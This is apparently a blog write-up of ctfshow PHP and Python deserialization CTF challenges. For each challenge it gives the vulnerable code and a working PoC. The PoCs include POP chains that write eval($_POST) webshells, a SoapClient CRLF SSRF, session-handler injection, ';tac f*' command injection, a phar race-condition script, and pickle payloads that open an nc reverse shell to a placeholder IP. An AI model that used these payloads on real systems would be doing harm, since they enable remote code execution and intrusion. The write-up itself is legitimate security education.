---
title: ctfshow-重温反序列化
id: ctfshow-重温反序列化
date: 2021-10-08 12:40:30
sidebar_position: 5
---

<!-- more -->

因为之前做的没写在md上，打算重做一遍，先从有点薄弱的反序列化开始，
后面有时间的话大概还会补一下命令执行、php特性和文件包含





> 常用魔术方法：
> `__wakeup()` 	  //执行unserialize()时，先会调用这个函数
> `__sleep()` 	  //执行serialize()时，先会调用这个函数
> `__destruct()`    //对象被销毁时触发
> `__call()` 	  //在对象上下文中调用不可访问的方法时触发
> `__callStatic()` //在静态上下文中调用不可访问的方法时触发
> `__get()`	   //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
> `__set()`	   //用于将数据写入不可访问的属性
> `__isset()`     //在不可访问的属性上调用isset()或empty()触发
> `__unset()` 	//在不可访问的属性上使用unset()时触发
> `__toString()`  //把类当作字符串使用时触发
> `__invoke()`   //当尝试将对象调用为函数时触发



## 254 认识类

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

让大家眼熟一下基本结构，传入的username和password等于类里的值就行

```
?username=xxxxxx&password=xxxxxx
```

## 255 初涉

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

简单分析一下：

1. 要定义username和password；从cookie传值user进行反序列化
2. 序列化得到的username和password要和传入的相等
3. isvip为true

poc：

```php
<?php

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
}

$a = new ctfShowUser();
echo urlencode(serialize($a));
```

payload:

```
get:?username=xxxxxx&password=xxxxxx

cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

![](https://i.loli.net/2021/10/08/yMDL92lbRrBYVXu.png)



## 256 初涉

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

分析：其余同上，不同的是要求username和password不等

改一下值就行：

poc:

```php
<?php

class ctfShowUser{
    public $username='xxxxxx1';
    public $password='xxxxxx2';
    public $isVip=true;
}

$a = new ctfShowUser();
echo urlencode(serialize($a));
```

payload：

```
get:?username=xxxxxx1&password=xxxxxx2

cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22xxxxxx1%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%22xxxxxx2%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```



## 257 ezpop

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

初涉pop链，先认识一些常见的魔法函数（具体可以看y4师傅的这篇[PHP反序列化总结_Y4tacker](https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5501)）

```php
__wakeup() 		//执行unserialize()时，先会调用这个函数
__sleep() 		//执行serialize()时，先会调用这个函数
__destruct() 	//对象被销毁时触发
__call() 		//在对象上下文中调用不可访问的方法时触发
__callStatic() 	//在静态上下文中调用不可访问的方法时触发
__get() 		//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() 		//用于将数据写入不可访问的属性
__isset() 		//在不可访问的属性上调用isset()或empty()触发
__unset() 		//在不可访问的属性上使用unset()时触发
__toString() 	//把类当作字符串使用时触发
__invoke() 		//当尝试将对象调用为函数时触发
```

分析：

入口在ctfShowUser->login函数，要求username和password和传入的一样，序列话不给值的话传啥都可以

当该对象被销毁时触发class->getinfo()，下面两个类都有getinfo，backDoor存在eval

那么：

1. ctfShowUser->class=new backDoor()
2. backDoor->code=要执行的命令

poc：（不设定username和password的话传什么都可以）

```php
<?php

class ctfShowUser{
    private $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}

class backDoor{
    private $code="system('tac ./flag.php');";
}

$a = new ctfShowUser();
echo urlencode(serialize($a));
```

payload：

```
get:?username=xxxxxx&password=xxxxxx

cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A25%3A%22system%28%27tac+.%2Fflag.php%27%29%3B%22%3B%7D%7D
```



## 258 正则

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

正则`preg_match('/[oc]:\d+:/i', $_COOKIE['user'])`，匹配对象o或者数字c
也就是 `o|c:数字`

绕过方法也很简单 ，参考[php反序列unserialize的一个小特性 – phpbug](https://www.phpbug.cn/archives/32.html)
按文中所说使用 `o:+数字`即可，如`O:3`->`o:+3`

poc:

```php
<?php

class ctfShowUser{
    public $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}

class backDoor{
    public $code='eval($_POST[1]);';
}

$a = new ctfShowUser();
$a = str_replace('O:', 'O:+', $a);
# $a = preg_replace('/([oc]\:)(\d+)/i', '$1+$2', serialize($a));

echo urlencode($a);

# O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D
```

![](https://i.loli.net/2021/10/17/1y8bmk9BfIdVUKC.png)



## 259 SSRF+SoapClient->__call()+CRLF

> hint：flag.php部分源码
>
> ```php
> $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
> array_pop($xff);
> $ip = array_pop($xff);
> 
> 
> if($ip!=='127.0.0.1'){
> 	die('error');
> }else{
> 	$token = $_POST['token'];
> 	if($token=='ctfshow'){
> 		file_put_contents('flag.txt',$flag);
> 	}
> }
> ```
>
> 

index.php

```php
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();

```

127.0.0.1访问flag.php，且传入token=ctfshow

但是试了一下xff发现不行，应该还检测了真实ip

```php
if($_SERVER['REMOTE_ADDR']==='127.0.0.1')
```

可以看到反序列化后会调用`$vip->getFlag();`那么就可以触发原生类SoapClient-的__call()方法，配合CRLF实现ssrf

> [SoapClient与CRLF组合拳 – purplet的博客](http://purplet.top/2020/12/24/soapclient与crlf组合拳/)
>
> [从一道题学习SoapClient与CRLF组合拳_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/110521104)
>
> # CRLF注入攻击
>
> CALF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。
>
> 在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。
>
> 所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。
>
> # SoapClient
>
> 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。

思路如下：构造poc，令vip=类SoapClient，然后调用不存在的getFlag()方法，触发`_call()`,从而发送一个POST请求；符合条件后就会将flag写入flag.txt，访问就能拿到flag

poc：

```php
<?php

$post_string = 'token=ctfshow';

$a = new SoapClient(null, array(
        'uri'=> "http://127.0.0.1/flag.php",
        'location' => 'http://127.0.0.1/flag.php',
        'user_agent'=>"edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded"."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
        )
);

echo(urlencode(serialize($a)));

?>
    
# O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A127%3A%22edge%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

flag会被写入到flag.txt，访问就能拿到flag



## 260  正则

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

反序列化后符合正则就行了

poc：

```php
<?php

class a{
    public $a = "ctfshow_i_love_36D";
}

$a = new a();
echo urlencode(serialize($a));
```





## 261 wakeup与unserialize，弱比较

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

把大部分魔术方法都重写了，分析一下关键函数：

1. `__wakeup`：要求username和password非空

   > 通常绕过`__wakeup`都是修改属性个数，但是这里的版本为7.4.16，该方法就不奏效了
   >
   > - 影响范围
   >
   > PHP5 < 5.6.25
   >
   > PHP7 < 7.0.10
   >
   > - 漏洞原理
   >
   > 当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。
   >
   > 
   >
   > 但是还存在着`__unserialize()`，并且在php官方文档中是这样说的：
   > **当同时存在`__wakeup`和`__unserialize()`的时候，只会调用`__unserialize()`**
   >
   > 所以这里不用管它-

2. `__unserialize`：令code=username . password

3. `__destruct`：符合弱比较$this->code==0x36d
   则执行file_put_content，两个参数也可控：username和password

   > [PHP 浅谈 == 和=== 中，数字和字符串比较的问题 Au-CSDN博客](https://blog.csdn.net/Auuuuuuuu/article/details/79621635)
   >
   > 
   >
   > 1.当字符串中 以 数字开头   +字符串+数字或字符(字符串)+...  格式与数字进行  == 判断时，
   >
   > 会取第一次出现字符(字符串)前的数字作为转换值。
   >
   > 2.当字符串中 以 字符(字符串)开头 +数字+数字或字符(字符串)+... 格式与数字进行 == 判断时，
   >
   > 不能转换为数字，被强制转换为0

   0x36d十进制为877，那么其与`877`+ `字符`进行弱比较，经本地测试就会返回true，但是在php8就不行了

目的就是赋值username和password为文件名和文件内容，最终利用file_put_contents写马，
而弱比较可以通过赋文件名为877xxxxx来绕过

poc：

```php
<?php

class ctfshowvip{
    public $username='877.php';
    public $password='<?php eval($_POST[1]);?>';
}


$a = new ctfshowvip();
echo urlencode(serialize($a));
```

## 262 字符逃逸

### 解法一

index.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);

```

这题考点是字符逃逸的关键在于：`$umsg = str_replace('fuck', 'loveU', serialize($msg));`

序列化后，正则匹配将原本`长度为4的fuck`换成`长度为5的loveU`，但因为是序列化后再进行的替换，其长度值没有改变，就造成了实际长度大于标记长度的情况，从而导致反序列化失败；但只要补充字符使得实际长度和标记一样即可成功反序列化。

再看index.php源码，类message只有from、msg、to可以通过get传参控制，
但想要拿到flag需要token=admin，那么我们就可以利用这个情况，补上token的序列化数据字符来实现控制

流程如下：

想要构造的序列化数据：`O:7:"message":1:{......";s:5:"token";s:5:"admin";}`
利用`";`构造前面$to的闭合，`";s:5:"token";s:5:"admin";}`这一串的长度为27
那么就传入27个fuck，使其能成功反序列化，并且成功闭合，使得反序列化后能够控制token

payload：

```
/?f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

然后再访问message.php即可

### 解法二

message.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

传值反序列化，token=admin即可

```php
<?php

class message{
    public $token='admin';
}


$a = new message();
echo urlencode(base64_encode(serialize($a)));
```

![](https://i.loli.net/2021/10/17/PAUZmDIzLvC52Q3.png)



## 263 session伪造

www.zip源码泄漏

seay扫一下或者自己审都行

inc.php

```php
<?php
ini_set('session.serialize_handler', 'php');
# ...
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
# ...
```

看到inc.php存在file_put_contents函数，
且设置session序列化引擎为php`ini_set('session.serialize_handler', 'php');`，
而其他页面则没有配置，猜测该页面的`session.serialize_handler`与默认配置`php.ini`中的不同

> 利用点是：session.serialize_handler不同引起的反序列化
>
> [带你走进PHP session反序列化漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6640)
> [深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)](https://www.jb51.net/article/116246.htm)

**在处理器不同的情况下，假如序列化和反序列化使用的处理器不同，就会形成漏洞**

看一下不同引擎的存储方式的不同之处：

- php_binary：存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

- php：存储方式是，键名+竖线+经过serialize()函数序列处理的值（key | value）

- php_serialize(php>5.5.4)：存储方式是，经过serialize()函数序列化处理的值 

  ![](https://i.loli.net/2021/10/19/IzvkafCy1AXGtx3.png)

 利用`|`分割键名键值的机制写入木马

关键代码：

- index.php，写入cookie
- check.php，通过 `$_SESSION['limit']=base64_decode($_COOKIE['limit']);` 将session写入session文件
- inc.php， `ini_set('session.serialize_handler', 'php');` 和 `session_start();` ，只要访问即会获取之前写入的 `session` 数据触发反序列化，
  因为check.php包含了inc.php，就会触发析构函数，就可以利用`file_put_contents`写入名为`log-.$this->username`，内容为`$this->password`的文件；
  然后访问文件即可（注意这里文件名前拼接了`log-`）
  ![](https://i.loli.net/2021/10/18/1uNMrUtIpafoGFT.png)

poc：

```php
<?php

class User{
    public $username = 'a.php';
    public $password = '<?php system("cat flag.php") ?>';
}


$a = new User();
echo base64_encode('|'.serialize($a));

```

## 264 字符逃逸（session传值）

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

message.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

做法payload同262，但是使用了session，传入有些差别

要注意的是：

- 因为`if(isset($_COOKIE['msg']))`的存在，所以还是要传一个cookie值`msg`以符合if判断
- php的session是从PHPSESSID获取的，所以要记下传payload后返回包的PHPSESSID，再传到message.php去



## 265 &引用

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

显然很难这么幸运传入一个token使得`$ctfshow->token=md5(mt_rand());`

将password指向token即可	(引用，类似c的指针)

poc：

```php
<?php

class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct(){
        $this->password = &$this->token;
    }
}

$a = new ctfshowAdmin();
echo serialize($a);

# O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}
```

## 266 类|函数大小写不敏感

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

只有一个检测点：
正则匹配：传入的参数不能有`ctfshow`，但这是我们的类名，是肯定不能省的
这里考点就是一个 **php的特性**：

- 函数名和类名大小写不敏感
- 变量名大小写敏感

poc：（不传username或者password也行，原本定义的就符合条件了）

```php
<?php

class CtfShow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}
$a = new CtfShow();
echo serialize($a);

# O:7:"CtfShow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
```

$cs是用的伪协议php://input赋值的，把payload post过去就行

![](https://i.loli.net/2021/10/18/3rpULTZAK4I21ig.png)



## 275 rce绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}

```

代码很长，利用点在析构函数，符合if判断`if($this->evilfile)`即可rce:`system('rm '.$this->filename);`

这题核心考点实际就是rce绕过；让evilfile为true，拼接一下绕过`rm`就行

```
GET: ?fn=;tac f*
POST: flag
```



## 276 phar反序列化

受影响函数：（by[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx's Blog (zsxsoft.com)](https://blog.zsxsoft.com/post/38)）
![](https://i.loli.net/2021/10/21/x1A6cTqOIa2SNHh.png)



```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}

```

比275多了个if判断： `if($this->evilfile && $this->admin)`，让两个都为true即可

没发现反序列化入口，不过存在file_put_content()可以配合phar://触发反序列化

但要注意的是他会把咱们的文件删掉`unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);`，不过在`unlink`前会先进行复制`copy($_GET['fn'],md5(mt_rand()).'.txt');`，io操作是需要一定时间的，可以尝试条件竞争来触发，搞个多线程：

1. 利用file_put_content写一个phar文件上去

   ```
   GET: ?fn=xxx.phar
   POST: phar文件内容
   ```

2. phar://协议读咱们上传的phar文件，从而触发反序列化

   ```
   GET: ?fn=phar://xxx.phar
   ```

   

poc：（先生成phar文件）

```php
<?php
class filter{
    public $filename=";tac fl*";
    public $evilfile = true;
    public $admin = true;
}

$a = new filter();
echo urlencode(serialize($a));

# 下面这部分就没改
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```



偷一份tari师傅的多线程脚本：

```python
import base64
import requests
import threading

flag = False
url = 'http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/'
data = open('./phar.phar', 'rb').read()

pre_resp = requests.get(url)
if pre_resp.status_code != 200:
    print(url + '\n链接好像挂了....')
    exit(1)

def upload():
    requests.post(url+"?fn=phar.phar", data=data)


def read():
    global flag
    r = requests.post(url+"?fn=phar://phar.phar/", data="")
    if "ctfshow{" in r.text and flag is False:
        print(base64.b64encode(r.text.encode()))
        flag = True

while flag is False:
    a = threading.Thread(target=upload)
    b = threading.Thread(target=read)
    a.start()
    b.start()
```



## 267-274|框架

---下面是框架题，等后面再细细研究

### 267-270 yii框架

about 源代码提示`<!--?view-source -->`

login弱口令admin/admin

访问url/?r=site/about&view-source得到反序列化点

poc和分析[我是怎么挖掘yii2反序列化0day的 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40)

### 271-273 Laravel

271：[laravelv5.7反序列化rce(CVE-2019-9081) | WisdomTree's Blog (laworigin.github.io)](https://laworigin.github.io/2019/02/21/laravelv5-7反序列化rce/)

272、273：[Laravel5.8.x反序列化POP链 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5911)

(二者php版本有点点差别，但poc没啥区别)

### 274 thinkphp5.1

[thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6619)





## 277、278 python 反序列化

无回显，搞个反弹shell，不会整python的反弹shell，抄一下：

yu师傅的脚本：

```python
import pickle
import base64
class A(object):
	def __reduce__(self):
		return(eval,('__import__("os").popen("nc xxx.xxx.xxx.xxx 4567 -e /bin/sh").read()',))
a=A()
test=pickle.dumps(a)
print(base64.b64encode(test))
```



tari师傅的脚本

```python
import base64
import pickle
import requests

class a():
    def __reduce__(self):
        return(__import__("os").popen, ('nc xxx.xxx.xxx.xxx 4567 -e /bin/sh',))

a = a()
